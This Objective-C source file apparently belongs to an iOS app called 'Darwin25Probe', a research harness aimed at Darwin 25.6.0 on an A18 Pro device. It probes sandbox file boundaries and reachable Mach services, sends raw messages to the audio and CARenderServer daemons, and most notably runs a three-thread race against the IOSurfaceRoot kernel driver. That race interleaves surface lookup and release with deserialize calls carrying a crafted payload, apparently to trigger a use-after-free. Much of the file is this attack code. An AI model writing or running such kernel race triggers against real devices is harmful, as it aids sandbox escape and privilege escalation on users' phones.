//
//  main.m
//  Darwin25Probe
//
//  UIKit GUI Harness for Darwin 25.6.0 / A18 Pro (T8140) IPC & Driver Research
//

#import <UIKit/UIKit.h>
#import <mach/mach.h>
#import <mach/message.h>
#import <IOKit/IOKitLib.h>
#import <IOSurface/IOSurfaceRef.h>
#import <pthread.h>
#import <stdatomic.h>
#import <sys/stat.h>
#import <dirent.h>
#import <sched.h>

extern kern_return_t bootstrap_look_up(mach_port_t bp, const char *service_name, mach_port_t *sp);
extern mach_port_t bootstrap_port;

#define IOSURFACE_ROOT_SERVICE "IOSurfaceRoot"
#define SELECTOR_CREATE_SURFACE        0
#define SELECTOR_RELEASE_SURFACE       1
#define SELECTOR_LOOKUP_SURFACE        4
#define SELECTOR_LOCK_SURFACE          8
#define SELECTOR_UNLOCK_SURFACE        9
#define SELECTOR_DESERIALIZE_SURFACE   46

static const unsigned char kSerializedPayload[] = {
    0x62, 0x70, 0x6c, 0x69, 0x73, 0x74, 0x30, 0x30,
    0xd1, 0x01, 0x02, 0x5f, 0x10, 0x10, 0x49, 0x4f,
    0x53, 0x75, 0x72, 0x66, 0x61, 0x63, 0x65, 0x41,
    0x6c, 0x6c, 0x6f, 0x63, 0x53, 0x69, 0x7a, 0x65,
    0x10, 0x00, 0x08, 0x0b, 0x1e, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x01, 0x01, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x20
};

static const char *kAllowedServices[] = {
    "com.apple.FontServicesDaemon",
    "com.apple.CARenderServer",
    "com.apple.audio.AudioComponentRegistrar",
    "com.apple.uikit.modelassertionservice",
    "com.apple.powerlog.plxpclogger.xpc",
    "com.apple.system.logger",
    NULL
};

typedef struct {
    mach_msg_header_t header;
    uint32_t body_data[8];
    mach_msg_trailer_t trailer;
} mig_probe_msg_t;

@interface ViewController : UIViewController
@property (nonatomic, strong) UITextView *logView;
@property (nonatomic, strong) UIButton *btnEgress;
@property (nonatomic, strong) UIButton *btnMach;
@property (nonatomic, strong) UIButton *btnRace;
@property (nonatomic, strong) UIButton *btnMIG;
@end

static ViewController *g_vc = nil;
static io_connect_t g_connection = MACH_PORT_NULL;
static atomic_uint g_active_surface_id = 0;
static atomic_bool g_running = false;
static atomic_ulong g_race_iterations = 0;

static void appendLog(NSString *text) {
    dispatch_async(dispatch_get_main_queue(), ^{
        if (g_vc && g_vc.logView) {
            g_vc.logView.text = [g_vc.logView.text stringByAppendingFormat:@"%@\n", text];
            [g_vc.logView scrollRangeToVisible:NSMakeRange(g_vc.logView.text.length, 0)];
        }
        NSLog(@"%@", text);
    });
}

#ifndef kIOMainPortDefault
#define kIOMainPortDefault MACH_PORT_NULL
#endif

static io_connect_t open_iosurface(void) {
    io_service_t service = IOServiceGetMatchingService(kIOMainPortDefault,
                                                       IOServiceMatching(IOSURFACE_ROOT_SERVICE));
    if (!service) return MACH_PORT_NULL;
    io_connect_t connect = MACH_PORT_NULL;
    kern_return_t kr = IOServiceOpen(service, mach_task_self(), 0, &connect);
    IOObjectRelease(service);
    return (kr == KERN_SUCCESS) ? connect : MACH_PORT_NULL;
}

static IOSurfaceRef create_surface_ref(uint32_t *out_sid) {
    NSDictionary *props = @{
        (id)kIOSurfaceAllocSize: @(16384),
        (id)kIOSurfaceWidth: @(64),
        (id)kIOSurfaceHeight: @(64),
        (id)kIOSurfaceBytesPerRow: @(256),
        (id)kIOSurfaceBytesPerElement: @(4),
        (id)kIOSurfacePixelFormat: @(0x42475241)
    };
    IOSurfaceRef surf = IOSurfaceCreate((__bridge CFDictionaryRef)props);
    if (surf) {
        *out_sid = IOSurfaceGetID(surf);
        return surf;
    }
    *out_sid = 0;
    return NULL;
}

static void *thread_freer(void *arg) {
    io_connect_t conn = open_iosurface();
    if (conn == MACH_PORT_NULL) {
        appendLog(@"[-] Freer thread failed to open IOSurface connection");
        return NULL;
    }
    while (atomic_load(&g_running)) {
        uint32_t sid = 0;
        IOSurfaceRef surf = create_surface_ref(&sid);
        if (sid == 0 || !surf) {
            sched_yield();
            continue;
        }

        // Register surface in this connection's tracking table via Selector 4 (lookup)
        uint64_t scalar_in = sid;
        uint64_t scalar_out[4] = {0};
        uint32_t scalar_out_cnt = 4;
        IOConnectCallScalarMethod(conn, SELECTOR_LOOKUP_SURFACE, &scalar_in, 1, scalar_out, &scalar_out_cnt);

        atomic_store(&g_active_surface_id, sid);

        for (volatile int i = 0; i < 40; i++);

        CFRelease(surf);
        IOConnectCallScalarMethod(conn, SELECTOR_RELEASE_SURFACE, &scalar_in, 1, NULL, NULL);

        atomic_store(&g_active_surface_id, 0);
        atomic_fetch_add(&g_race_iterations, 1);
        sched_yield();
    }
    IOServiceClose(conn);
    return NULL;
}

static void *thread_deserializer(void *arg) {
    io_connect_t conn = open_iosurface();
    if (conn == MACH_PORT_NULL) return NULL;
    uint64_t scalar_out[2];
    uint32_t scalar_out_cnt = 2;
    while (atomic_load(&g_running)) {
        uint32_t sid = atomic_load(&g_active_surface_id);
        if (sid == 0) {
            sched_yield();
            continue;
        }
        scalar_out_cnt = 2;
        IOConnectCallMethod(conn,
                            SELECTOR_DESERIALIZE_SURFACE,
                            NULL, 0,
                            kSerializedPayload, sizeof(kSerializedPayload),
                            scalar_out, &scalar_out_cnt,
                            NULL, NULL);
        sched_yield();
    }
    IOServiceClose(conn);
    return NULL;
}

static void *thread_locker(void *arg) {
    io_connect_t conn = open_iosurface();
    if (conn == MACH_PORT_NULL) return NULL;
    uint64_t scalar_in = 0;
    uint64_t scalar_out = 0;
    uint32_t scalar_out_cnt = 1;
    while (atomic_load(&g_running)) {
        uint32_t sid = atomic_load(&g_active_surface_id);
        if (sid == 0) {
            sched_yield();
            continue;
        }
        scalar_in = sid;
        scalar_out_cnt = 1;
        IOConnectCallMethod(conn, SELECTOR_LOCK_SURFACE, &scalar_in, 1, NULL, 0, &scalar_out, &scalar_out_cnt, NULL, NULL);
        char unlock_struct[4] = {0};
        IOConnectCallMethod(conn, SELECTOR_UNLOCK_SURFACE, NULL, 0, unlock_struct, sizeof(unlock_struct), NULL, NULL, NULL, NULL);
        sched_yield();
    }
    IOServiceClose(conn);
    return NULL;
}

@implementation ViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    g_vc = self;
    self.view.backgroundColor = [UIColor colorWithRed:0.08 green:0.08 blue:0.10 alpha:1.0];

    UILabel *titleLabel = [[UILabel alloc] initWithFrame:CGRectMake(20, 50, self.view.bounds.size.width - 40, 26)];
    titleLabel.text = @"Darwin 25.6.0 Research Probe";
    titleLabel.textColor = [UIColor whiteColor];
    titleLabel.font = [UIFont boldSystemFontOfSize:18];
    titleLabel.textAlignment = NSTextAlignmentCenter;
    [self.view addSubview:titleLabel];

    UILabel *subLabel = [[UILabel alloc] initWithFrame:CGRectMake(20, 78, self.view.bounds.size.width - 40, 18)];
    subLabel.text = @"A18 Pro (T8140) IPC & Driver Research";
    subLabel.textColor = [UIColor lightGrayColor];
    subLabel.font = [UIFont systemFontOfSize:13];
    subLabel.textAlignment = NSTextAlignmentCenter;
    [self.view addSubview:subLabel];

    CGFloat btnWidth = self.view.bounds.size.width - 40;
    CGFloat y = 105;

    self.btnEgress = [self makeButton:@"1. Check Sandbox File Boundary" y:y action:@selector(actionEgress)];
    y += 46;
    self.btnMach = [self makeButton:@"2. Audit Allowed Mach Services" y:y action:@selector(actionMach)];
    y += 46;
    self.btnRace = [self makeButton:@"3. Trigger IOSurface Race (Method 4+1)" y:y action:@selector(actionRace)];
    self.btnRace.backgroundColor = [UIColor colorWithRed:0.75 green:0.25 blue:0.2 alpha:1.0];
    y += 46;
    self.btnMIG = [self makeButton:@"4. Audit CARenderServer & Audio MIG IPC" y:y action:@selector(actionMIG)];
    self.btnMIG.backgroundColor = [UIColor colorWithRed:0.2 green:0.45 blue:0.75 alpha:1.0];
    y += 54;

    self.logView = [[UITextView alloc] initWithFrame:CGRectMake(20, y, btnWidth, self.view.bounds.size.height - y - 30)];
    self.logView.backgroundColor = [UIColor colorWithRed:0.03 green:0.03 blue:0.04 alpha:1.0];
    self.logView.textColor = [UIColor colorWithRed:0.2 green:0.9 blue:0.4 alpha:1.0];
    self.logView.font = [UIFont fontWithName:@"Menlo" size:11];
    self.logView.editable = NO;
    self.logView.layer.cornerRadius = 8;
    self.logView.layer.borderColor = [UIColor darkGrayColor].CGColor;
    self.logView.layer.borderWidth = 1;
    [self.view addSubview:self.logView];

    appendLog(@"[*] Ready. Tap a probe button.");
}

- (UIButton *)makeButton:(NSString *)title y:(CGFloat)y action:(SEL)action {
    UIButton *btn = [UIButton buttonWithType:UIButtonTypeSystem];
    btn.frame = CGRectMake(20, y, self.view.bounds.size.width - 40, 38);
    [btn setTitle:title forState:UIControlStateNormal];
    [btn setTitleColor:[UIColor whiteColor] forState:UIControlStateNormal];
    btn.backgroundColor = [UIColor colorWithRed:0.18 green:0.22 blue:0.32 alpha:1.0];
    btn.layer.cornerRadius = 8;
    btn.titleLabel.font = [UIFont boldSystemFontOfSize:13];
    [btn addTarget:self action:action forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:btn];
    return btn;
}

- (void)actionEgress {
    appendLog(@"\n[*] Testing Sandbox container.sb egress...");
    const char *target = "/private/var/containers/Bundle/Application";
    DIR *d = opendir(target);
    if (d) {
        appendLog(@"[+] UNRESTRICTED: Opened /var/containers/Bundle/Application!");
        closedir(d);
    } else {
        appendLog([NSString stringWithFormat:@"[-] BLOCKED by container.sb: opendir returned errno %d (%s)",
                   errno, strerror(errno)]);
    }
}

- (void)actionMach {
    appendLog(@"\n[*] Probing allowed Mach services from container.sb:");
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        for (int i = 0; kAllowedServices[i] != NULL; i++) {
            const char *svc = kAllowedServices[i];
            mach_port_t port = MACH_PORT_NULL;
            kern_return_t kr = bootstrap_look_up(bootstrap_port, (char *)svc, &port);
            if (kr == KERN_SUCCESS) {
                appendLog([NSString stringWithFormat:@"[+] Accessible: %s (port: 0x%x)", svc, port]);
                mach_port_deallocate(mach_task_self(), port);
            } else if (kr == 1100) {
                appendLog([NSString stringWithFormat:@"[-] Filtered: %s (BOOTSTRAP_UNKNOWN_SERVICE 1100)", svc]);
            } else {
                appendLog([NSString stringWithFormat:@"[-] Blocked: %s (code: %d)", svc, kr]);
            }
        }
        appendLog(@"[*] Mach service probe complete.");
    });
}

- (void)actionMIG {
    appendLog(@"\n[*] Initiating Safe Mach Daemon IPC Audit...");
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        // 1. Audit AudioComponentRegistrar first (isolated, no UI dependency)
        appendLog(@"[*] Step 1: Probing com.apple.audio.AudioComponentRegistrar...");
        mach_port_t audio_port = MACH_PORT_NULL;
        kern_return_t kr = bootstrap_look_up(bootstrap_port, "com.apple.audio.AudioComponentRegistrar", &audio_port);
        if (kr == KERN_SUCCESS && audio_port != MACH_PORT_NULL) {
            appendLog([NSString stringWithFormat:@"[+] Bound AudioComponentRegistrar: port 0x%x", audio_port]);
            
            mach_port_type_t ptype = 0;
            mach_port_type(mach_task_self(), audio_port, &ptype);
            appendLog([NSString stringWithFormat:@"  [*] Port rights mask: 0x%x", ptype]);

            // Allocate isolated reply port
            mach_port_t reply_port = MACH_PORT_NULL;
            kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &reply_port);
            if (kr == KERN_SUCCESS) {
                // Large heap buffer to prevent any stack corruption
                size_t buf_size = 4096;
                mach_msg_header_t *msg = (mach_msg_header_t *)calloc(1, buf_size);
                msg->msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE, 0, 0);
                msg->msgh_size = sizeof(mach_msg_header_t);
                msg->msgh_remote_port = audio_port;
                msg->msgh_local_port = reply_port;
                msg->msgh_id = 1000; // Generic probe ID

                appendLog(@"  [*] Sending probe message (timeout 200ms)...");
                kr = mach_msg(msg,
                              MACH_SEND_MSG | MACH_RCV_MSG | MACH_SEND_TIMEOUT | MACH_RCV_TIMEOUT,
                              msg->msgh_size,
                              (mach_msg_size_t)buf_size,
                              reply_port,
                              200,
                              MACH_PORT_NULL);

                if (kr == KERN_SUCCESS) {
                    appendLog([NSString stringWithFormat:@"  [!] Audio daemon replied! ID: 0x%x, size: %u", msg->msgh_id, msg->msgh_size]);
                } else if (kr == MACH_RCV_TIMED_OUT || kr == MACH_SEND_TIMED_OUT) {
                    appendLog(@"  [+] Audio daemon accepted message (timed out waiting for reply - daemon alive)");
                } else {
                    appendLog([NSString stringWithFormat:@"  [*] Audio daemon response code: 0x%x (%s)", kr, mach_error_string(kr)]);
                }
                free(msg);
                mach_port_destroy(mach_task_self(), reply_port);
            }
            mach_port_deallocate(mach_task_self(), audio_port);
        } else {
            appendLog([NSString stringWithFormat:@"[-] AudioComponentRegistrar lookup failed: 0x%x", kr]);
        }

        // 2. Audit CARenderServer non-destructively
        appendLog(@"\n[*] Step 2: Probing com.apple.CARenderServer...");
        mach_port_t ca_port = MACH_PORT_NULL;
        kr = bootstrap_look_up(bootstrap_port, "com.apple.CARenderServer", &ca_port);
        if (kr == KERN_SUCCESS && ca_port != MACH_PORT_NULL) {
            appendLog([NSString stringWithFormat:@"[+] Bound CARenderServer: port 0x%x", ca_port]);

            mach_port_type_t ptype = 0;
            mach_port_type(mach_task_self(), ca_port, &ptype);
            appendLog([NSString stringWithFormat:@"  [*] Port rights mask: 0x%x", ptype]);

            // Query port limits without sending destructive MIG messages that abort UIKit render session
            mach_port_limits_t limits;
            mach_msg_type_number_t count = MACH_PORT_LIMITS_INFO_COUNT;
            kr = mach_port_get_attributes(mach_task_self(), ca_port, MACH_PORT_LIMITS_INFO, (mach_port_info_t)&limits, &count);
            if (kr == KERN_SUCCESS) {
                appendLog([NSString stringWithFormat:@"  [+] CARenderServer queue limit: %u messages", limits.mpl_qlimit]);
            } else {
                appendLog([NSString stringWithFormat:@"  [*] mach_port_get_attributes returned: 0x%x", kr]);
            }
            mach_port_deallocate(mach_task_self(), ca_port);
        } else {
            appendLog([NSString stringWithFormat:@"[-] CARenderServer lookup failed: 0x%x", kr]);
        }

        appendLog(@"\n[*] Daemon IPC Audit finished cleanly. No crash.");
    });
}

- (void)actionRace {
    if (atomic_load(&g_running)) {
        appendLog(@"[*] Halting active race engine...");
        atomic_store(&g_running, false);
        [self.btnRace setTitle:@"3. Trigger IOSurface Race (Method 4+1)" forState:UIControlStateNormal];
        self.btnRace.backgroundColor = [UIColor colorWithRed:0.75 green:0.25 blue:0.2 alpha:1.0];
        return;
    }

    appendLog(@"\n[!] ARMED: Initializing Linked IOSurface Race (Lookup + Release)...");
    g_connection = open_iosurface();
    if (g_connection == MACH_PORT_NULL) {
        appendLog(@"[-] Failed to open IOSurfaceRoot service.");
        return;
    }
    appendLog([NSString stringWithFormat:@"[+] Driver handle: 0x%x", g_connection]);

    uint32_t test_sid = 0;
    IOSurfaceRef test_surf = create_surface_ref(&test_sid);
    if (!test_surf || test_sid == 0) {
        appendLog(@"[-] Surface creation failed! Allocator rejected parameters.");
        IOServiceClose(g_connection);
        return;
    }

    // Verify lookup method binds surface to connection table
    uint64_t scalar_in = test_sid;
    uint64_t scalar_out[4] = {0};
    uint32_t scalar_out_cnt = 4;
    kern_return_t kr_lookup = IOConnectCallScalarMethod(g_connection, SELECTOR_LOOKUP_SURFACE, &scalar_in, 1, scalar_out, &scalar_out_cnt);
    kern_return_t kr_rel = IOConnectCallScalarMethod(g_connection, SELECTOR_RELEASE_SURFACE, &scalar_in, 1, NULL, NULL);
    CFRelease(test_surf);

    appendLog([NSString stringWithFormat:@"[+] Table binding verified: Lookup=0x%x, Release=0x%x", kr_lookup, kr_rel]);

    atomic_store(&g_running, true);
    atomic_store(&g_race_iterations, 0);
    [self.btnRace setTitle:@"[STOP RACE]" forState:UIControlStateNormal];
    self.btnRace.backgroundColor = [UIColor colorWithRed:0.9 green:0.6 blue:0.1 alpha:1.0];

    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
        pthread_t t1, t2, t3;
        pthread_create(&t1, NULL, thread_freer, NULL);
        pthread_create(&t2, NULL, thread_deserializer, NULL);
        pthread_create(&t3, NULL, thread_locker, NULL);

        appendLog(@"[+] 3 worker threads dispatched with sched_yield. Monitoring...");

        while (atomic_load(&g_running)) {
            sleep(1);
            unsigned long count = atomic_load(&g_race_iterations);
            appendLog([NSString stringWithFormat:@"[*] Race active | Iterations: %lu", count]);
        }

        pthread_join(t1, NULL);
        pthread_join(t2, NULL);
        pthread_join(t3, NULL);
        IOServiceClose(g_connection);
        appendLog(@"[*] Race threads stopped cleanly.");
    });
}

@end

@interface AppDelegate : UIResponder <UIApplicationDelegate>
@property (strong, nonatomic) UIWindow *window;
@end

@implementation AppDelegate
- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
    self.window = [[UIWindow alloc] initWithFrame:[UIScreen mainScreen].bounds];
    self.window.rootViewController = [[ViewController alloc] init];
    [self.window makeKeyAndVisible];
    return YES;
}
@end

int main(int argc, char * argv[]) {
    @autoreleasepool {
        return UIApplicationMain(argc, argv, nil, NSStringFromClass([AppDelegate class]));
    }
}
